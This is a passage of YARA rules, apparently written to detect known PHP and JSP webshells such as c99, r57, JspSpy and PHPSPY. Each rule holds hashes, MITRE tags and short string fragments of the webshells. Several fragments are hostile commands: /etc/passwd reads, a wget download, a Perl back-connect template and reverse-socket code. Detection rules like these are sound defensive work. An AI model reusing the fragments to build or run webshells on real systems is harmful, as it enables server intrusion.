      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9abd397c6498c41967b4dd327cf8b55a"
      hash2 = "56c005690da2558690c4aa305a31ad37"
      hash3 = "532b93e02cddfbb548ce5938fe2f5559"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" " 
      $s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR" 
   condition: 
      all of them
}

rule Webshell_JspSpyJDK51_luci_jsp_xxx_RID33CD : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
      hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
      $s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
   condition: 
      all of them
}

rule Webshell_wso2_5_1_wso2_5_wso2_RID31BD : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:35:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
      hash2 = "cbc44fb78220958f81b739b493024688"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec" 
      $s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na" 
   condition: 
      all of them
}

rule Webshell_QueryDong_spyjsp2010_t00ls_RID3421 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:17:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "8b457934da3821ba58b06a113e0d53d9"
      hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')" 
      $s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"" 
   condition: 
      all of them
}

rule Webshell_404_data_suiyue_RID303A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:30:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
      hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+" 
   condition: 
      all of them
}

rule Webshell_r57shell_SnIpEr_EgY_SpIdEr_RID3416 : CRIME DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:15:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ae025c886fbe7f9ed159f49593674832"
      hash2 = "911195a9b7c010f61b66439d9048f400"
      hash3 = "697dae78c040150daff7db751fc0c03c"
      tags = "CRIME, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name" 
      $s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1" 
      $s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size=" 
   condition: 
      all of them
}

rule Webshell_JspSpy_xxx_RID2ED6 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
      hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
      hash3 = "14e9688c86b454ed48171a9d4f48ace8"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var" 
      $s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu" 
      $s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i" 
   condition: 
      all of them
}

rule Webshell_JSP_MA_download_RID3037 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
      hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su" 
      $s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but" 
      $s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class=" 
   condition: 
      all of them
}

rule Webshell_JFolder_Leo_RID2ECB : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:29:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a7e25b8ac605753ed0c438db93f6c498"
      hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash3 = "36331f2c81bad763528d0ae00edf55be"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
      $s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
   condition: 
      all of them
}

rule Webshell_shell_phpspy_2006_arabicspy_RID3505 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:55:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "40a1f840111996ff7200d18968e42cfe"
      hash2 = "e0202adff532b28ef1ba206cf95962f2"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype" 
      $s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P" 
   condition: 
      all of them
}

rule Webshell_in_JFolder_jfolder01_jsp_leo_warn_RID378A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:42:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8979594423b68489024447474d113894"
      hash2 = "ec482fc969d182e5440521c913bab9bd"
      hash3 = "f98d2b33cd777e160d1489afed96de39"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD" 
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi" 
   condition: 
      all of them
}

rule Webshell_2_520_icesword_job_ma1_ma4_2_RID3477 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9abd397c6498c41967b4dd327cf8b55a"
      hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
      hash3 = "56c005690da2558690c4aa305a31ad37"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\"," 
      $s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ" 
      $s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor" 
   condition: 
      all of them
}

rule Webshell_lite_PHPSPY_RID2E97 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:21:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "42f211cec8032eb0881e87ebdb3d7224"
      hash2 = "0712e3dc262b4e1f98ed25760b206836"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma" 
      $s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE" 
      $s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; " 
   condition: 
      2 of them
}

rule Webshell_phpspy_arabicspy_RID3167 : DEMO SCRIPT T1007 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:21:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "40a1f840111996ff7200d18968e42cfe"
      hash2 = "e0202adff532b28ef1ba206cf95962f2"
      hash3 = "802f5cae46d394b297482fd0c27cb2fc"
      tags = "DEMO, SCRIPT, T1007, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname." 
   condition: 
      all of them
}

rule Webshell_C99_Shell_ci_Biz_RID3061 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:37:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f2fa878de03732fbf5c86d656467ff50"
      hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
      hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\"" 
   condition: 
      all of them
}

rule Webshell_2008_2009lite_2009mssql_RID31A2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:30:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3f4d454d27ecc0013e783ed921eeecde"
      hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');" 
      $s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all" 
   condition: 
      all of them
}

rule Webshell_Arabicspy_PHPSPY_RID3087 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:43:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
      hash2 = "42f211cec8032eb0881e87ebdb3d7224"
      hash3 = "40a1f840111996ff7200d18968e42cfe"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
      $s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d" 
   condition: 
      all of them
}

rule Webshell_JspSpyJDK5_RID2E1D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "14e9688c86b454ed48171a9d4f48ace8"
      hash2 = "341298482cf90febebb8616426080d1d"
      hash3 = "88fc87e7c58249a398efd5ceae636073"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
      $s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
   condition: 
      1 of them
}

rule Webshell_Dive_Shell_Emperor_Hacking_Team_RID36B8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:07:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f8a6d5306fb37414c5c772315a27832f"
      hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals" 
      $s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
   condition: 
      all of them
}

rule Webshell_JFolder_jfolder01_xxx_RID32B9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:17:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
      hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
      hash3 = "8979594423b68489024447474d113894"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE" 
   condition: 
      all of them
}

rule Webshell_jsp_reverse_jsp_RID30FA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:02:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
      hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
      $s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
      $s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
   condition: 
      all of them
}

rule Webshell_JFolder_jfolder01_jsp_leo_RID343D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:22:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
      hash2 = "8979594423b68489024447474d113894"
      hash3 = "ec482fc969d182e5440521c913bab9bd"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
      $s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
      $s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
      $s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
   condition: 
      2 of them
}

rule Webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2_RID369B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:03:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9abd397c6498c41967b4dd327cf8b55a"
      hash2 = "56c005690da2558690c4aa305a31ad37"
      hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
      $s6 = "password = (String)session.getAttribute(\"password\");" fullword
      $s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231" 
   condition: 
      2 of them
}

rule Webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx_RID39AE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 19:14:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ef43fef943e9df90ddb6257950b3538f"
      hash2 = "ae025c886fbe7f9ed159f49593674832"
      hash3 = "911195a9b7c010f61b66439d9048f400"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI" 
      $s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC" 
   condition: 
      all of them
}

rule Webshell_PHPJackal_itsecteam_shell_RID3469 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:29:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e2830d3286001d1455479849aacbbb38"
      hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
      hash3 = "40c6ecf77253e805ace85f119fe1cebb"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
      $s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|" 
      $s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+" 
   condition: 
      2 of them
}

rule Webshell_Shell_Biz_c100_RID2F75 : DEMO SCRIPT T1087_001 T1105 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
      hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
      tags = "DEMO, SCRIPT, T1087_001, T1105, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri" 
      $s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\"" 
      $s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
      $s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de" 
      $s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER" 
   condition: 
      2 of them
}

rule Webshell_NIX_REMOTE_WEB_SHELL_RID30D4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f3ca29b7999643507081caab926e2e74"
      hash2 = "527cf81f9272919bf872007e21c4bdda"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type=" 
      $s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
      $s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
      $s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
   condition: 
      2 of them
}

rule Webshell_C99_w4cking_Shell_RID30C8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d3f38a6dc54a73d304932d9227a739ec"
      hash2 = "9c34adbc8fd8d908cbb341734830f971"
      hash3 = "f2fa878de03732fbf5c86d656467ff50"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<b>HEXDUMP:</b><nobr>" 
      $s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
      $s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r" 
      $s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB " 
      $s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
      $s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>" 
   condition: 
      2 of them
}

rule Webshell_phpspy_2006_arabicspy_RID328E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:10:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
      hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
      hash3 = "40a1f840111996ff7200d18968e42cfe"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$this -> addFile($content, $filename);" fullword
      $s3 = "function addFile($data, $name, $time = 0) {" fullword
      $s8 = "function unix2DosTime($unixtime = 0) {" fullword
      $s9 = "foreach($filelist as $filename){" fullword
   condition: 
      all of them
}

rule Webshell_c99_c99shell_RID2EC7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:29:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
      hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
      hash3 = "048ccc01b873b40d57ce25a4c56ea717"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv" 
      $s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
      $s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66" 
      $s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources" 
      $s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos" 
      $s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!" 
   condition: 
      2 of them
}

rule Webshell_ok_style_1_JspSpy_RID3168 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:21:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d71716df5042880ef84427acee8b121e"
      hash2 = "344f9073576a066142b2023629539ebd"
      hash3 = "32dea47d9c13f9000c4c807561341bee"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
      $s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?" 
      $s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
      $s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>" 
   condition: 
      2 of them
}

rule Webshell_queryDong_spyjsp2010_zend_RID343F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:22:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "8b457934da3821ba58b06a113e0d53d9"
      hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
